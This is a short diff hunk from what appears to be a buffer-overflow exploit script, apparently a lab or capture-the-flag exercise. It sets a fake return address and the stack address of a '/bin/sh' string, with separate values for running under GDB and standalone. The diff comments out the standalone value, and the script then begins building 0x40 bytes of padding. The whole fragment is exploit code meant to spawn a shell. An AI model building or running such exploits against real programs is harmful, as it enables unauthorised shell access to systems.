@@ -8,7 +8,7 @@ fake_retaddr = "DDDD"
 # In GDB
 sh_str_addr = "\xfc\xcb\xff\xff" # end of our entire string
 # Standalone
-sh_str_addr = "\x3c\xcc\xff\xff" # end of our entire string
+#sh_str_addr = "\x3c\xcc\xff\xff" # end of our entire string
 sh_str = "/bin/sh"
 
 exploit = "A"*0x40 # padding
